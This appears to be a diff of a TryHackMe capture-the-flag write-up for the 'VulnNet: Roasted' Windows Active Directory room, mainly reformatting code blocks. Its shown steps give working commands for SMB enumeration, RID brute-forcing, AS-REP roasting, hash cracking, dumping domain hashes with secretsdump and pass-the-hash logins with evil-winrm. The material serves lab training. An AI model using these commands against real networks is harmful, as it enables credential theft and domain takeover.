@@ -6,7 +6,7 @@ Link to room: https://tryhackme.com/room/vulnnetroasted
 
 Let's start with an nmap scan:
 
-```
+```python
 # Nmap 7.91 scan initiated Sun May 16 16:34:12 2021 as: nmap -p- -v -sC -sV -Pn -oN nmap-all-ports vulnet.thm
 Nmap scan report for vulnet.thm (10.10.123.68)
 Host is up (0.23s latency).
@@ -49,12 +49,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Sun May 16 17:06:24 2021 -- 1 IP address (1 host up) scanned in 1932.04 seconds
 ```
 
-Based on the opened ports like 53(DNS) and 88(kerberos), we can assume this is a windows active directory machine
+Based on some of the opened ports like 53(DNS) and 88(kerberos), we can predict this is a windows active directory machine
 
 ## SMB Enum
 
 we can enumerate shares anonymously providing a null password using smbmap
-```
+```python
 ╭── /opt/share/tryhackme/vulnet  master ✘✘✘ ✭  
 ╰────▶ smbmap -H vulnet.thm -u guest -p ''
 [+] IP: vulnet.thm:445  Name: unknown                                           
@@ -70,9 +70,9 @@ we can enumerate shares anonymously providing a null password using smbmap
 ```
 
 There are read-only access to three shares (IPC$, VulnNet-Business-Anonymous, and VulnNet-Enterprise-Anonymous)
-The first share out of the 3 hints us of the possibility to do anonymous user enumeration. We will come to that later. so let's access the last 2 shares and see what contents they have
+The IPC$ share hints us of the possibility to do anonymous user enumeration. We will come to that later. Let's access the last two shares and see what contents they have
 
-```
+```python
 ╭── /opt/share/tryhackme/vulnet/smb_loot  master ✘✘✘
 ╰────▶ smbclient //vulnet.thm/VulnNet-Business-Anonymous
 Enter WORKGROUP\root's password: 
@@ -96,22 +96,23 @@ smb: \> ls
   Enterprise-Safety.txt               A      503  Thu Mar 11 20:24:34 2021
   Enterprise-Sync.txt                 A      496  Thu Mar 11 20:24:34 2021
 ```
-
+##
 Let's download all the contents onto our local machine
 ```
 smb: \> mget *
 ```
-
+##
 We get potential usernames and other info from the downloaded files from smb. so let's build our username list. Spoiler alert!!, the usernames in the files were generic and didn't match with those create on the machine
 
 Time to find a way to enumerate usernames on the box. i will be using rid-brute from crackmapexec
-```
+```python
 crackmapexec smb vulnet.thm -u robot -p '' --rid-brute | grep  SidTypeUser
 ```
 Since this is anonymous login, you can replace username robot with whatever you like. I used robot because i amm one -:)
 
 ![image](https://user-images.githubusercontent.com/68066436/118685539-3038aa80-b7d1-11eb-91e9-572fcd48794a.png)
 
+##
 Extract the usernames with rid greater than 1000 into a username file. I named mine users.txt with below content
 
 ```
@@ -121,15 +122,16 @@ t-skid
 j-goldenhand
 j-leet
 ```
+##
 kerberoasting with the username file returns a hash for t-skid
 
-```
+```python
 python3 GetNPUsers.py -dc-ip 10.10.176.144 -usersfile users.txt vulnnet-rst.local/
 ```
 ![image](https://user-images.githubusercontent.com/68066436/118688670-41cf8180-b7d4-11eb-9917-96222176f67f.png)
 
 Put whole hash (from $krb to end of hash) in a file and crack with john-the-ripper
-```
+```python
 john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting-hash
 ```
 ![image](https://user-images.githubusercontent.com/68066436/118689287-d1753000-b7d4-11eb-8b7f-869cfe676122.png)
@@ -141,14 +143,14 @@ pass: <redacted>
 ```
 
 Try to access smb again with new creds to see if we get more access to some shares
-```
+```python
 smbmap -H vulnet.thm -u t-skid -p '<redacted>'
 ```
 ![image](https://user-images.githubusercontent.com/68066436/118689875-77c13580-b7d5-11eb-88a7-c99bc26d771f.png)
 Notice t-skid has read access to NETLOGON and SYSVOL shares which we did have with the anonymous logins
 
 Let's access NETLOGON share with smbclient and see what we've got in there
-```
+```python
 smbclient //vulnet.thm/NETLOGON -U t-skid
 ```
 ![image](https://user-images.githubusercontent.com/68066436/118690902-82c89580-b7d6-11eb-95f2-9fb1715a6c6b.png)
@@ -163,7 +165,7 @@ pass: <redacted>
 ```
 
 Pass a-whitehat's creds into evil-winrm to get the initial foothold into the machine
-```
+```python
 evil-winrm -i vulnet.thm -u a-whitehat -p <redacted>
 ```
 ![image](https://user-images.githubusercontent.com/68066436/118693125-c45a4000-b7d8-11eb-9b0b-cf9abceba4aa.png)
@@ -176,13 +178,13 @@ Checked groups and realised user a-whitehat belongs to domain admins group, this
 ![image](https://user-images.githubusercontent.com/68066436/118693532-21ee8c80-b7d9-11eb-9b2d-195be8421d32.png)
 
 Let's dump the hashes with secretsdump
-```
+```python
 python3 secretsdump.py -just-dc a-whitehat:<redacted password>@vulnnet-rst.local
 ```
 ![image](https://user-images.githubusercontent.com/68066436/118694206-d2f52700-b7d9-11eb-9b00-698568e0e87f.png)
 
 What do we do now that we have the administrator's hashes? Erhmmm, let's pass-the-hash using evil-winrm
-```
+```python
 evil-winrm -i vulnet.thm -u administrator -H <redacted NTLM hash of administrator>
 ```
 ![image](https://user-images.githubusercontent.com/68066436/118695296-084e4480-b7db-11eb-8194-300f527f336b.png)
@@ -203,8 +205,8 @@ Navigate to C:\Users\Administrator\Desktop\system.txt
 
 
 
-
-## This is the end of my write-up, hope you enjoyed reading....
+##
+This is the end of my write-up, hope you enjoyed reading....
 
 
 
